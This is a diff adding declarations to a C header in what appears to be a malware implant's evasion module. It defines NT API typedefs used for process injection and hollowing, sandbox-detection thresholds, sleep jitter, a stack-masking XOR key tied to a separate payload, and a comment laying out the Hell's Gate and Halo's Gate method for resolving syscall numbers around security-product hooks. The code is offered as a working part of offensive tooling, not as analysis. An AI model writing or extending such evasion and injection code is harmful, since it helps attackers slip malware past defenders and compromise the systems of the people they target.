@@ -118,3 +118,84 @@ typedef struct _EV_PROCESS_BASIC_INFORMATION{
     ULONG_PTR UniqueProcessId;
     PVOID  Reserved3;
 } EV_PROCESS_BASIC_INFORMATION;
+
+/* ── NtCreateThreadEx private flags ── */
+#define EV_THREAD_CREATE_FLAGS_SKIP_THREAD_ATTACH 0x00000002
+
+/* ── NtCreateThreadEx PS_ATTRIBUTE (abbreviated; only StartAddress used) ── */
+typedef struct _EV_PS_ATTRIBUTE{
+    ULONG_PTR Attribute;
+    SIZE_T    Size;
+    union{
+        ULONG_PTR Value;
+        PVOID     ValuePtr;
+    };
+    PSIZE_T ReturnLength;
+} EV_PS_ATTRIBUTE;
+
+typedef struct _EV_PS_ATTRIBUTE_LIST{
+    SIZE_T       TotalLength;
+    EV_PS_ATTRIBUTE Attributes[1];
+} EV_PS_ATTRIBUTE_LIST;
+
+/* ── NT function pointer typedefs ── */
+typedef NTSTATUS (NTAPI *pfnNtAllocateVirtualMemory)(
+    HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
+
+typedef NTSTATUS (NTAPI *pfnNtWriteVirtualMemory)(
+    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+
+typedef NTSTATUS (NTAPI *pfnNtProtectVirtualMemory)(
+    HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
+
+typedef NTSTATUS (NTAPI *pfnNtFreeVirtualMemory)(
+    HANDLE, PVOID *, PSIZE_T, ULONG);
+
+typedef NTSTATUS (NTAPI *pfnNtCreateThreadEx)(
+    PHANDLE, ACCESS_MASK, PEV_OBJECT_ATTRIBUTES,
+    HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T,
+    EV_PS_ATTRIBUTE_LIST *);
+
+typedef NTSTATUS (NTAPI *pfnNtUnmapViewOfSection)(HANDLE, PVOID);
+
+typedef NTSTATUS (NTAPI *pfnNtQueryInformationProcess)(
+    HANDLE, DWORD, PVOID, ULONG, PULONG);
+
+typedef NTSTATUS (NTAPI *pfnNtReadVirtualMemory)(
+    HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
+
+typedef NTSTATUS (NTAPI *pfnNtOpenSection)(
+    PHANDLE, ACCESS_MASK, PEV_OBJECT_ATTRIBUTES);
+
+typedef NTSTATUS (NTAPI *pfnNtMapViewOfSection)(
+    HANDLE, HANDLE, PVOID *, ULONG_PTR, SIZE_T,
+    PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
+
+/* ── Sandbox heuristic constants ── */
+#define EV_MIN_PROCESSORS  2
+#define EV_MIN_RAM_MB      2048
+#define EV_MIN_UPTIME_MS   300000ULL  /* 5 minutes */
+
+/* ── Jitter percentage applied to ev_sleep_jitter ── */
+#define EV_JITTER_PCT      20
+
+/* ── Stack region to XOR during sleep (bytes from stack frame pointer) ── */
+#define EV_STACK_MASK_LEN  4096
+
+/* ── EV_XOR_KEY: key for stack masking during sleep — different from lb_payload XOR_KEY ── */
+#define EV_XOR_KEY  ((BYTE)0xD3)
+
+/* ═══════════════════════════════════════════════════════════════════════════
+ * §2  NT syscall number (SSN) resolution
+ *
+ * Walk the export table of the in-memory ntdll.dll to find each Nt* function.
+ * Extract the SSN from the stub bytes: on unhooked ntdll the first 4 bytes are
+ *   4C 8B D1       mov r10, rcx
+ *   B8 xx xx xx xx mov eax, <SSN>
+ * so SSN = *(DWORD*)(stub + 4).
+ *
+ * If the stub has been hooked (first byte is E9 = JMP), scan forward through
+ * the export table until we find the next unhooked Nt* stub, then back-calculate
+ * the SSN by subtracting the index delta.  This is the "Hell's Gate" + "Halo's
+ * Gate" technique: works even when the direct stub is patched.
+ * ═══════════════════════════════════════════════════════════════════════════ */
